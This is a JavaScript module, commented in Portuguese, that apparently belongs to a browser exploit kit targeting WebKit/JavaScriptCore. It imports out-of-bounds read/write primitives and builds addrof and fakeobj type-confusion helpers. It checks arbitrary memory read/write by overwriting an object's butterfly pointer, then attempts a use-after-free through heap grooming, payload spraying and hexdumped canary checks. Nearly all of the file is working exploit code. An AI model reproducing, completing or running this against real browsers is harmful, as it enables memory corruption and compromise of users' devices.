// js/script3/testArrayBufferVictimCrash.mjs (v07 - Heap Feng Shui Aprimorado)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. A FASE 5 agora usa uma técnica de Heap Feng Shui muito mais robusta,
//    alocando e liberando múltiplos objetos para aumentar a probabilidade de sucesso.
// 2. Corrigido o RangeError na verificação do resultado, usando um DataView para
//    ler o valor de 64 bits da memória de forma segura.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute,
    oob_write_absolute,
    arb_read as core_arb_read,
    arb_write as core_arb_write
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R91_IterativeCrashDebug";

// =======================================================================================
// FUNÇÕES DE DEPURAÇÃO (ESTRATÉGIA DE LEITURA EM BLOCO)
// =======================================================================================
async function readMemoryBlock(address, size) {
    const OOB_DV_METADATA_BASE = 0x58;
    const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE + getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_VECTOR_OFFSET');
    const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE + getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET');
    const oob_dv = getOOBDataView();
    let original_vector, original_length;
    try {
        original_vector = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8);
        original_length = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4);
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, size, 4);
        const memory_block = new Uint8Array(size);
        for (let i = 0; i < size; i++) {
            memory_block[i] = oob_dv.getUint8(i);
        }
        return memory_block;
    } catch (e) {
        logS3(`ERRO em readMemoryBlock: ${e.message}`, "critical");
        return new Uint8Array(0);
    } finally {
        if (original_vector && original_length !== undefined) {
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, original_vector, 8);
            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, original_length, 4);
        }
    }
}
function hexdump(title, memory_block, base_address = null) {
    const address_str = base_address ? base_address.toString(true) : "N/A";
    logS3(`--- INÍCIO HEXDUMP: ${title} @ ${address_str} (${memory_block.length} bytes) ---`, "debug");
    let output = "";
    for (let i = 0; i < memory_block.length; i += 16) {
        const chunk = memory_block.slice(i, i + 16);
        let line_address = base_address ? base_address.add(i).toString(true) : i.toString(16).padStart(8, '0');
        const hex_part = Array.from(chunk).map(byte => byte.toString(16).padStart(2, '0')).join(' ');
        const ascii_part = Array.from(chunk).map(byte => (byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : '.').join('');
        output += `${line_address}: ${hex_part.padEnd(47)} |${ascii_part}|\n`;
    }
    logS3(output, "leak");
    logS3(`--- FIM HEXDUMP: ${title} ---`, "debug");
}

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}
function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}
// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else { return defaultValue; }
    }
    if (typeof current === 'number') { return current; }
    if (typeof current === 'string' && String(current).startsWith('0x')) { return parseInt(String(current), 16) || defaultValue; }
    return defaultValue;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADora PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");
    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou vazamento WebKit falhou.",
        webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
    };
    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
    try {
        await PAUSE_S3(1000);
        const LOCAL_JSC_OFFSETS = {
            JSCell_STRUCTURE_POINTER_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSCell.STRUCTURE_POINTER_OFFSET'),
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
        };

        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        const addrof = (obj) => {
            const confused_array = [13.37]; const victim_array = [{ a: 1 }]; victim_array[0] = obj; return doubleToInt64(confused_array[0]); };
        const fakeobj = (addr) => {
            const confused_array = [13.37]; const victim_array = [{ a: 1 }]; confused_array[0] = int64ToDouble(addr); return victim_array[0]; };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        logS3("--- FASE 4: Verificando L/E com Primitivas do Core... ---", "subtest");
        const test_obj_for_rw_verification = {a:1};
        const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
        const prop_addr = test_obj_for_rw_verification_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
        await core_arb_write(prop_addr, NEW_POLLUTION_VALUE, 8);
        const value_read_for_verification = await core_arb_read(prop_addr, 8);
        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
            logS3("+++++++++++ SUCESSO! L/E arbitrária (core) é funcional. ++++++++++++", "vuln");
            final_result.success = true;
        } else {
            throw new Error(`A verificação de L/E com primitivas do core falhou.`);
        }

        // --- FASE 5: TENTATIVA DE CORRUPÇÃO CONTROLADA (UAF EXPLOIT) ---
        logS3("--- FASE 5: Tentativa de Corrupção Controlada (UAF Exploit) ---", "subtest");
        
        const PAYLOAD_MARKER = new AdvancedInt64(0x41414141, 0x42424242); // "BBBB" "AAAA"
        const VICTIM_SIZE = 128;
        const NUM_VICTIMS = 1000;

        // 1. Alocar muitas vítimas para preparar o heap
        logS3(`Alocando ${NUM_VICTIMS} vítimas de ${VICTIM_SIZE} bytes...`, 'info');
        let victims = [];
        for (let i = 0; i < NUM_VICTIMS; i++) {
            let v = new Uint8Array(VICTIM_SIZE);
            v.fill(0xCC); // Padrão da vítima
            victims.push(v);
        }
        
        // Escolher uma vítima do meio como nossa "canário" para observar
        const canary_victim_obj = victims[Math.floor(NUM_VICTIMS / 2)];
        const canary_addr = addrof(canary_victim_obj);
        logS3(`Vítima "canário" selecionada no endereço: ${canary_addr.toString(true)}`, 'info');
        
        let block_before = await readMemoryBlock(canary_addr, VICTIM_SIZE);
        hexdump("Estado da Vítima 'Canário' ANTES do UAF", block_before, canary_addr);

        // 2. Liberar TODAS as vítimas para criar muitos "buracos" no heap
        logS3(`Liberando ${NUM_VICTIMS} vítimas para acionar o UAF...`, "warn");
        victims = []; // O GC irá coletar os objetos, liberando a memória

        // 3. Alocar muitos payloads para preencher os buracos
        logS3(`Alocando ${NUM_VICTIMS} payloads para sobrescrever a memória liberada...`, "info");
        const payload_as_bigint = (BigInt(PAYLOAD_MARKER.high()) << 32n) | BigInt(PAYLOAD_MARKER.low());
        let payloads = [];
        for (let i = 0; i < NUM_VICTIMS; i++) {
            let p = new ArrayBuffer(VICTIM_SIZE);
            let p_view = new DataView(p);
            for (let j = 0; j < VICTIM_SIZE; j += 8) {
                p_view.setBigUint64(j, payload_as_bigint, true);
            }
            payloads.push(p);
        }
        
        await PAUSE_S3(100); // Pausa para garantir que as alocações se assentem.

        // 4. Verificar se a corrupção na nossa "canário" ocorreu
        logS3("Verificando se a memória da 'canário' foi sobrescrita pelo payload...", "test");
        let block_after = await readMemoryBlock(canary_addr, VICTIM_SIZE);
        hexdump("Estado da 'Canário' APÓS o UAF e alocação do payload", block_after, canary_addr);

        // --- CORREÇÃO (v07) ---
        // Análise final usando um DataView para evitar o RangeError.
        const view = new DataView(block_after.buffer);
        const read_low = view.getUint32(0, true);
        const read_high = view.getUint32(4, true);
        const first_qword = new AdvancedInt64(read_low, read_high);

        if(first_qword.equals(PAYLOAD_MARKER)) {
            logS3("++++++++++ SUCESSO DA EXPLORAÇÃO DO UAF! ++++++++++", "vuln");
            logS3("A memória da vítima foi sobrescrita com sucesso pelo nosso payload controlado.", "good");
            final_result.webkit_leak_details = { success: true, msg: "Corrupção de memória controlada via UAF foi bem-sucedida."};
        } else {
             logS3("---------- FALHA NA EXPLORAÇÃO DO UAF ----------", "error");
             logS3("A memória da vítima não foi sobrescrita pelo payload. O heap pode precisar de mais 'grooming'.", "warn");
             final_result.webkit_leak_details = { success: false, msg: "Falha ao controlar a corrupção de memória."};
        }

        return final_result;

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
        final_result.webkit_leak_details.success = false;
        final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        webkit_leak_result: final_result.webkit_leak_details,
    };
}
